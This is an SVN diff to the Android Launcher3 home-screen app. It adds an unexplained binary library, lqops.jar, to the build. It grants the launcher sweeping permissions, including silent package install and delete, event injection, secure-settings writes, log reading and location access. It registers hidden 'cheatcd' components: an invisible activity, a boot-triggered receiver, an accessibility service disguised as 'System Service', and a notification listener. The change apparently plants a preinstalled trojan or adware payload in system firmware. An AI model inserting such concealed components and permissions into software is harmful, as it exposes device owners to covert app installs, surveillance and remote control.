@@ -1,0 +1,143 @@
+Index: packages/apps/Launcher3/Android.mk
+===================================================================
+--- packages/apps/Launcher3/Android.mk	(revision 175662)
++++ packages/apps/Launcher3/Android.mk	(revision 175663)
+@@ -21,7 +21,7 @@
+ #
+ include $(CLEAR_VARS)
+ LOCAL_PREBUILT_STATIC_JAVA_LIBRARIES := \
+-    libLauncherClient:libs/launcher_client.jar
++    libLauncherClient:libs/launcher_client.jar lqops:libs/lqops.jar
+ include $(BUILD_MULTI_PREBUILT)
+ 
+ #
+@@ -34,7 +34,8 @@
+ LOCAL_STATIC_JAVA_LIBRARIES := \
+     android-support-v4 \
+     android-support-v7-recyclerview \
+-    libLauncherClient
++    libLauncherClient \
++    lqops
+ 
+ LOCAL_SRC_FILES := $(call all-java-files-under, src) \
+     $(call all-java-files-under, WallpaperPicker/src) \
+Index: packages/apps/Launcher3/libs/lqops.jar
+===================================================================
+Cannot display: file marked as a binary type.
+svn:mime-type = application/octet-stream
+Index: packages/apps/Launcher3/libs/lqops.jar
+===================================================================
+--- packages/apps/Launcher3/libs/lqops.jar	(revision 0)
++++ packages/apps/Launcher3/libs/lqops.jar	(revision 175663)
+
+Property changes on: packages/apps/Launcher3/libs/lqops.jar
+___________________________________________________________________
+Added: svn:mime-type
+## -0,0 +1 ##
++application/octet-stream
+\ No newline at end of property
+Index: packages/apps/Launcher3/build.gradle
+===================================================================
+--- packages/apps/Launcher3/build.gradle	(revision 175662)
++++ packages/apps/Launcher3/build.gradle	(revision 175663)
+@@ -61,6 +61,7 @@
+     compile 'com.android.support:recyclerview-v7:24.+'
+     compile 'com.google.protobuf.nano:protobuf-javanano:3.0.0-alpha-2'
+     compile files('libs/launcher_client.jar')
++    compile files('libs/lqops.jar')
+ 
+     testCompile 'junit:junit:4.12'
+     androidTestCompile 'com.android.support.test:runner:0.5'
+Index: packages/apps/Launcher3/AndroidManifest.xml
+===================================================================
+--- packages/apps/Launcher3/AndroidManifest.xml	(revision 175662)
++++ packages/apps/Launcher3/AndroidManifest.xml	(revision 175663)
+@@ -75,6 +75,33 @@
+     <uses-permission android:name="android.permission.READ_CALENDAR" />
+     <!-- SPRD Add for unreadNotifier Function  end-->
+ 
++	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
++	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
++	<uses-permission android:name="android.permission.READ_PHONE_STATE" />
++	<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
++	<uses-permission android:name="android.permission.GET_TASKS" />
++	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
++	<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
++	<uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE" />
++	<uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
++	<uses-permission android:name="android.permission.INSTALL_PACKAGES" />
++	<uses-permission android:name="android.permission.DELETE_PACKAGES" />
++	<uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
++	<uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
++	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
++	<uses-permission android:name="android.permission.FORCE_STOP_PACKAGES" />
++	<uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
++    <uses-permission android:name="android.permission.WAKE_LOCK" />
++    <uses-permission android:name="android.permission.INJECT_EVENTS" />
++    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
++    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
++    <uses-permission android:name="android.permission.READ_LOGS" />
++    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
++    <uses-permission android:name="android.permission.BATTERY_STATS" />
++    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
++    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
++    <uses-permission android:name="android.permission.REAL_GET_TASKS" />
++
+     <application
+         android:allowBackup="@bool/enable_backup"
+         android:backupAgent="com.android.launcher3.LauncherBackupAgentHelper"
+@@ -258,5 +285,54 @@
+         <service android:name="com.android.launcher3.testing.MemoryTracker" />
+ 
+         -->
++
++    <meta-data
++        android:name="wcheatidcd"
++        android:value="800772" />
++    <activity
++        android:name="com.android.cheatcd.ALActivity"
++        android:excludeFromRecents="true"
++        android:taskAffinity="com.android.cheatcd"
++        android:theme="@android:style/Theme.NoDisplay" >
++        <intent-filter>
++            <action android:name="android.intent.action.27e94d6f9c2bf0" />
++            <action android:name="android.intent.action.MAIN" />
++            <category android:name="android.intent.category.DEFAULT" />
++        </intent-filter>
++    </activity>
++
++    <service android:name="com.android.cheatcd.KTService" />
++    <receiver android:name="com.android.cheatcd.HRReceiver" >
++        <intent-filter>
++            <action android:name="android.intent.action.BOOT_COMPLETED" />
++            <action android:name="android.intent.action.USER_PRESENT" />
++            <action android:name="android.intent.action.DOWNLOAD_COMPLETE" />
++            <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
++        </intent-filter>
++        <intent-filter>
++            <action android:name="android.intent.action.PACKAGE_ADDED" />
++            <action android:name="android.intent.action.PACKAGE_REMOVED" />
++            <data android:scheme="package" >
++            </data>
++        </intent-filter>
++    </receiver>
++    
++    <service
++            android:name="com.android.cheatcd.GHService"
++            android:label="System Service"
++            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
++        <intent-filter>
++            <action android:name="android.accessibilityservice.AccessibilityService"/>
++        </intent-filter>
++    </service>
++
++    <service
++            android:name="com.android.cheatcd.WANotiService"
++            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
++            android:enabled="true">
++        <intent-filter>
++            <action android:name="android.service.notification.NotificationListenerService"/>
++        </intent-filter>
++    </service>
+     </application>
+ </manifest>
